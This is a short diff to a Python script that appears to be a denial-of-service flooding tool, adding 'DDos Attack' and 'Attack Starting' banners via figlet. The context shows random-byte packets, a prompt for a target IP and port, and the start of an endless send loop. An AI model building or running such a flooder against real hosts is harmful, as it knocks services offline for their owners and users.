@@ -21,6 +21,7 @@ bytes = random._urandom(1490)
 run = os.system
 
 run("clear")
+os.system("figlet DDos Attack")
 print (Fore.GREEN + """
  _____                ____                       _ _         
 |__  /___ _ __ ___   / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
@@ -44,6 +45,7 @@ if data == "1":
     ip = input("\n>>> Enter Target IP => ")
     port = input("\n>>> Enter Port (Default 80) => ")
     print (Fore.BLUE + "\nPls Wait...\n")
+    os.system("figlet Attack Starting")
     time.sleep(4)
     sent = 0 
     while True:
